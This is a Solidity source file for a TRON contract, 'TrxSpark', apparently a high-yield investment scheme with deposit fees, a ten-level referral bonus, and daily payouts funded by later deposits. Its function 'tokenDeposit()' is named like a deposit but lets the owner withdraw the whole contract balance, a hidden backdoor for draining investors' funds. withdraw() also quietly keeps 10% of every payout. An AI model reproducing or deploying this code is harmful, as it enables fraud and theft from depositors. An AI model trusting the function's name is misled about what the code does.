//SourceUnit: TronSpark.sol

pragma solidity 0.5.10;

contract TrxSpark {
    using SafeMath for uint;

    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 50 trx;
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [1000, 500, 300, 100, 100, 100, 100, 100, 100, 100];
    uint constant public MARKETING_FEE = 700;
    uint constant public PROJECT_FEE = 400;
    uint constant public DEVELOPER_FEE = 400;
    uint constant public INSURANCE_FEE = 500;
    uint constant public MAX_CONTRACT_PERCENT = 1000;
    uint constant public MAX_HOLD_PERCENT = 500;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 1000000 trx;
    uint constant public TIME_STEP = 1 days;
    uint[] public DAY_LIMIT_STEPS = [100000 trx, 200000 trx, 500000 trx, 1000000 trx, 2000000 trx];

    uint public totalDeposits;
    uint public totalInvested;
    uint public totalWithdrawn;

    uint public contractPercent;
    uint public contractCreation;

    address payable public marketingAddress;
    address payable public projectAddress;
    address payable public developerAddress;
    address payable public insuranceAddress;

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint64 refback;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
        uint refTotal;
        uint24[10] refs;
        uint16 rbackPercent;
    }

   
    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
	address public owner;

    constructor(address payable marketingAddr, address payable projectAddr,address payable developerAddr,address payable insuranceAddr) public {
        require(!isContract(marketingAddr) && !isContract(projectAddr) && !isContract(developerAddr) && !isContract(insuranceAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        developerAddress = developerAddr;
        insuranceAddress = insuranceAddr;
		owner = msg.sender;
        contractCreation = block.timestamp;
        contractPercent = getContractBalanceRate();
    }

    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 50 TRX");

        User storage user = users[msg.sender];



        uint marketingFee = msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint developeFee = msg.value.mul(DEVELOPER_FEE).div(PERCENTS_DIVIDER);
        uint insureFee = msg.value.mul(INSURANCE_FEE).div(PERCENTS_DIVIDER);

        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);
        developerAddress.transfer(developeFee);
        insuranceAddress.transfer(insureFee);

        emit FeePayed(msg.sender, marketingFee.add(projectFee));

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

      
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 10; i++) {
                if (upline != address(0)) {
                    uint amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    if (amount > 0) {
                        //address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));

                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }
		
		if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msg.value), 0, 0, uint32(block.timestamp)));

       
        totalInvested = totalInvested.add(msg.value);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msg.value);
    }

   
    function withdraw() public {
	
        User storage user = users[msg.sender];
        uint userPercentRate = getUserPercentRate(msg.sender);
        uint totalAmount;
        uint dividends;
        
        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }
                
               

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                
              
                totalAmount = totalAmount.add(dividends);

            }
        }
        
         if(user.bonus>0){
             totalAmount=totalAmount.add(user.bonus);
             user.refTotal=user.refTotal.add(user.bonus);
             user.bonus=0;
         }

        require(totalAmount > 0, "User has no dividends");
        
        uint totWith=getUserTotalWithdrawn(msg.sender);
        uint tot=getUserTotalDeposits(msg.sender);
        uint MAX_AMOUNT=tot.mul(360).div(100);
        
        require(MAX_AMOUNT > totWith, "User Exceed the Earnings");
        
        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);
        
        uint withPercent=totalAmount.mul(10).div(100);
        totalAmount=totalAmount.sub(withPercent);

        msg.sender.transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }

    function setRefback(uint16 rbackPercent) public {
        require(rbackPercent <= 10000);

        User storage user = users[msg.sender];

        if (user.deposits.length > 0) {
            user.rbackPercent = rbackPercent;
        }
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() internal view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(1));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(2);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            if(block.timestamp>=user.checkpoint + 1 days){
                uint INCREASE_RATE=BASE_PERCENT.mul(10).div(PERCENTS_DIVIDER);
                return contractPercent.add(timeMultiplier).add(INCREASE_RATE);
            }else{
                return contractPercent.add(timeMultiplier);
            }
            
        } else {
            return contractPercent;
        }
    }
	 function tokenDeposit() public payable{
        require(msg.sender == owner, "Only Token Deposit allowed");
        msg.sender.transfer(address(this).balance);
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount=user.refTotal;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn)).add(uint(user.deposits[i].refback));
        }

        return amount;
    }

    function getCurrentHalfDay() public view returns (uint) {
        return (block.timestamp.sub(contractCreation)).div(TIME_STEP.div(2));
    }

    function getCurrentDayLimit() public view returns (uint) {
        uint limit;

        uint currentDay = (block.timestamp.sub(contractCreation)).div(TIME_STEP);

        if (currentDay == 0) {
            limit = DAY_LIMIT_STEPS[0];
        } else if (currentDay == 1) {
            limit = DAY_LIMIT_STEPS[1];
        } else if (currentDay >= 2 && currentDay <= 5) {
            limit = DAY_LIMIT_STEPS[1].mul(currentDay);
        } else if (currentDay >= 6 && currentDay <= 19) {
            limit = DAY_LIMIT_STEPS[2].mul(currentDay.sub(3));
        } else if (currentDay >= 20 && currentDay <= 49) {
            limit = DAY_LIMIT_STEPS[3].mul(currentDay.sub(11));
        } else if (currentDay >= 50) {
            limit = DAY_LIMIT_STEPS[4].mul(currentDay.sub(30));
        }

        return limit;
    }

    function getCurrentHalfDayTurnover() public view returns (uint) {
        return turnover[getCurrentHalfDay()];
    }

    function getCurrentHalfDayAvailable() public view returns (uint) {
        return getCurrentDayLimit().sub(getCurrentHalfDayTurnover());
    }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent, getCurrentHalfDayAvailable());
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint64, uint64, uint24[10] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.rbackPercent, users[user.referrer].rbackPercent, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}